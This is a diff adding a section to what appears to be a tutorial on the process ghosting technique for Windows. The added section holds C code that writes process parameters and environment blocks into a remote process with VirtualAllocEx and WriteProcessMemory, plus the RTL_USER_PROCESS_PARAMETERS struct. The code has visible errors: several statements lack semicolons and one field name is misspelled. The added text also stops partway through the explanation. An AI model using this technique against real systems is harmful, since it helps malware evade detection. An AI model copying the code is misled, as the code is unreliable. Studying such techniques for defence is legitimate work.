@@ -344,6 +344,99 @@ Finally, we use the [CreateEnvironmentBlock()](https://learn.microsoft.com/en-us
 
 With all of this at hand, we can now call the [RtlCreateProcessParameters(](https://www.freepascal.org/daily/packages/winunits-jedi/jwanative/rtlcreateprocessparameters.html) function to register our own process parameters.
 
+Now, this is the part where it gets tricky. First, take a look at the `write_params()` function:
+
+```c
+LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
+	PVOID buffer = proc_params;
+	ULONG_PTR env_end = NULL;
+	ULONG_PTR buffer_end = (ULONG_PTR)proc_params + proc_params->Length;
+	SIZE_T buffer_size;
+	
+	// Check for environment variables
+	
+	if (proc_params->Environment) {
+		if ((ULONG_PTR)proc_params > (ULONG_PTR)proc_params->Environment) {
+			buffer = (PVOID)proc_params->Environment;
+		}
+	
+		env_end = (ULONG_PTR)proc_params->Environment + proc_params->EnvironmentSize;
+		
+		if (env_end > buffer_end) {
+		buffer_end = env_end;
+		}
+	}
+	
+	// Calculate buffer size
+	buffer_size = buffer_end - (ULONG_PTR)buffer;
+	
+	if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+		WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)
+		
+		if (proc_params->Environment) {
+			WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL);
+		}
+		return (LPVOID)proc_params;
+	
+	}
+	
+	
+	VirtualAllocEx(hprocess, (LPVOID)proc_params, proc_params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+	
+	WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL);
+	
+	if (proc_params->Environment) {
+		VirtualAllocEx(hprocess, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)
+	}
+	
+	return (LPVOID)proc_params;
+
+}
+```
+
+
+There are two cases which can arise during writing Process Parameters and the Environment Block: 
+- They are in continuous memory locations, i.e. one after the another
+- They are in non-continous memory locations
+ 
+Before that, check out the `RTL_USER_PROCESS_PARAMETERS` struct:
+```c
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+	ULONG MaximumLength;
+	ULONG Length;
+	ULONG Flags;
+	ULONG DebugFlags;
+	PVOID ConsoleHandle;
+	ULONG ConsoleFlags;
+	HANDLE StandardInput;
+	HANDLE StandardOutput;
+	HANDLE StandardError;
+	CURDIR CurrentDirectory;
+	UNICODE_STRING DllPath;
+	UNICODE_STRING ImagePathName;
+	UNICODE_STRING CommandLine;
+	PVOID Environment;
+	ULONG StartingX;
+	ULONG StartingY;
+	ULONG CountX;
+	ULONG CountY;
+	ULONG CountCharsX;
+	ULONG CountCharsY;
+	ULONG FillAttribute;
+	ULONG WindowFlags;
+	ULONG ShowWindowFlags;
+	UNICODE_STRING WindowTitle;
+	UNICODE_STRING DesktopInfo;
+	UNICODE_STRING ShellInfo;
+	UNICODE_STRING RuntimeData;
+	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
+	ULONG EnvironmentSize;
+} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+```
+
+Now, back to dealing with the memory locations. 
+
 ## References
 - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
 - https://fourcore.io/blogs/how-a-windows-process-is-created-part-1
